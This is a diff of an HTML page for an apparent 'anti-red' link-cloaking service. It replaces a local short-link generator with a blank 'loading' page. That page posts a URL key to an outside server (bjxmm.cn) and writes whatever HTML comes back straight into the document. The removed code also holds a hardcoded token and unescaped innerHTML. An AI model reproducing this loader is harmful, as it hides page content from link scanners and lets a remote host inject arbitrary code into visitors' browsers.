@@ -1,163 +1,45 @@
+
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
+
 <head>
-    <meta charset"UTF-8">
-    <title>云域防红专用</title>
-    <meta name=="viewport" content"width=device-width, initial-scale=1.0">
-   
+    <title>loading</title>
 </head>
+
 <body>
-  
-
-    <script>
-        // 系统配置
-        const CONFIG = {
-            TOKEN: 'cc77fb8efb04a0ba445772fa03083f16',  // 接口验证令牌
-            TYPE: 'cyn',                                // 服务类型标识
-            DOMAIN: 'https://yyfh2019.github.io',       // 短链域名
-            CODE_LENGTH: 6,                             // 短码长度
-            STORAGE_KEY: 'url_mappings_v2',             // 本地存储键名
-            CHAR_SET: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' // 短码字符集
-        };
-
-        // 初始化数据存储
-        let urlMappings = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEY)) || {};
-
-        // 路由处理（自动执行）
-        (function processRequest() {
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            // 处理短码重定向
-            if (urlParams.has('code')) {
-                const shortCode = urlParams.get('code');
-                const targetUrl = urlMappings[shortCode];
-                if (targetUrl) {
-                    window.location.replace(targetUrl);
+    <div style="text-align: center; margin-top: 20px; color: #ff4d4f; font-size: 16px;" id="msg"></div>
+   <!-- <script src="//cdn.staticfile.org/jquery/3.7.1/jquery.js"></script>-->
+    <script src="//code.jquery.com/jquery-3.7.1.min.js"></script>
+ <script type="text/javascript">
+        var siteurl = '//bjxmm.cn/';
+        var $_GET = {};
+        document.location.search.replace(/\??(?:([^=]+)=([^&]*)&?)/g, function () {
+            function decode(s) {
+                return decodeURIComponent(s.split('+').join(' '));
+            }
+            $_GET[decode(arguments[1])] = decode(arguments[2]);
+        });
+        $(function () {
+            var key = $_GET['key'];
+         /*
+let url = window.location.href;
+let decodedUrl = decodeURIComponent(url); 
+let regex = /(?:\?[^?]*\?)([^&\-]*)\-/;
+let matches = decodedUrl.match(regex);
+if (matches && matches[1]) {
+    var key = matches[1];
+}*/
+            $.post(siteurl + 'index/api/find', {
+                key
+            }, function (result) {
+                if (result.code == 200) {
+                    document.write(result.data.html);
                 } else {
-                    showAlert('⚠️ 短链接不存在或已过期', 'error');
+                    $('#msg').html(result.msg);
                 }
-                return;
-            }
-
-            // 处理API请求
-            if (urlParams.has('type') && urlParams.has('token') && urlParams.has('url')) {
-                handleApiRequest(urlParams);
-            }
-        })();
-
-        // 生成短链接（界面调用）
-        function generateShortUrl() {
-            const longUrl = document.getElementById('inputUrl').value.trim();
-            clearAlerts();
-
-            if (!validateUrl(longUrl)) {
-                showAlert('❌ 请输入有效的URL地址（需包含协议头 http:// 或 https://）', 'error');
-                return;
-            }
-
-            const shortCode = createShortCode(longUrl);
-            const shortUrl = `${CONFIG.DOMAIN}/${shortCode}`;
-            
-            displayResult(shortUrl, longUrl);
-        }
-
-        // API请求处理
-        function handleApiRequest(params) {
-            if (params.get('type') !== CONFIG.TYPE || params.get('token') !== CONFIG.TOKEN) {
-                document.body.innerHTML = 'Invalid token or type';
-                return;
-            }
-
-            try {
-                const longUrl = decodeURIComponent(params.get('url'));
-                if (!validateUrl(longUrl)) {
-                    document.body.innerHTML = 'Invalid URL';
-                    return;
-                }
-
-                const shortCode = createShortCode(longUrl);
-                document.write(`${CONFIG.DOMAIN}/${shortCode}`);
-            } catch (e) {
-                document.body.innerHTML = 'URL decoding failed';
-            }
-        }
-
-        // 生成唯一短码
-        function createShortCode(longUrl) {
-            let code;
-            do {
-                code = generateRandomCode();
-            } while (urlMappings[code]);
-
-            urlMappings[code] = longUrl;
-            localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(urlMappings));
-            return code;
-        }
-
-        // 生成随机码
-        function generateRandomCode() {
-            const buffer = new Uint32Array(CONFIG.CODE_LENGTH);
-            window.crypto.getRandomValues(buffer);
-            return Array.from(buffer, n => CONFIG.CHAR_SET[n % CONFIG.CHAR_SET.length]).join('');
-        }
-
-        // 显示结果
-        function displayResult(shortUrl, longUrl) {
-            const timestamp = new Date().toLocaleString();
-            document.getElementById('resultContainer').innerHTML = `
-                <div class="alert alert-success">
-                    ✅ 生成成功 <small>(${timestamp})</small>
-                </div>
-                <p>短链接：</p>
-                <input value="${shortUrl}" 
-                       readonly 
-                       onclick="this.select()"
-                       style="width:100%; padding:0.8rem; margin:1rem 0; border: 1px solid #ddd; border-radius:6px;">
-                <div style="display: flex; gap: 1rem; margin-top: 1rem;">
-                    <button onclick="copyUrl('${shortUrl}')">复制链接</button>
-                    <button onclick="window.open('${shortUrl}', '_blank')">测试访问</button>
-                </div>
-                <div style="margin-top: 1rem; color: #666; font-size:0.9em">
-                    对应长链接：<a href="${longUrl}" target="_blank">${truncateUrl(longUrl, 50)}</a>
-                </div>
-            `;
-        }
-
-        // 工具函数
-        function validateUrl(url) {
-            try {
-                const u = new URL(url);
-                return u.protocol === 'http:' || u.protocol === 'https:';
-            } catch {
-                return false;
-            }
-        }
-
-        function showAlert(message, type = 'error') {
-            const alertBox = document.getElementById('errorAlert');
-            alertBox.textContent = message;
-            alertBox.className = `alert alert-${type}`;
-            alertBox.style.display = 'block';
-            setTimeout(() => alertBox.style.display = 'none', 5000);
-        }
-
-        function clearAlerts() {
-            document.querySelectorAll('.alert').forEach(el => {
-                el.style.display = 'none';
-            });
-        }
-
-        function copyUrl(url) {
-            navigator.clipboard.writeText(url)
-                .then(() => showAlert('✅ 已复制到剪贴板', 'success'))
-                .catch(() => showAlert('❌ 复制失败，请手动选择复制', 'error'));
-        }
-
-        function truncateUrl(url, maxLength) {
-            return url.length > maxLength 
-                ? url.substring(0, maxLength) + '...' 
-                : url;
-        }
+            }, 'json');
+        });
     </script>
 </body>
+
 </html>
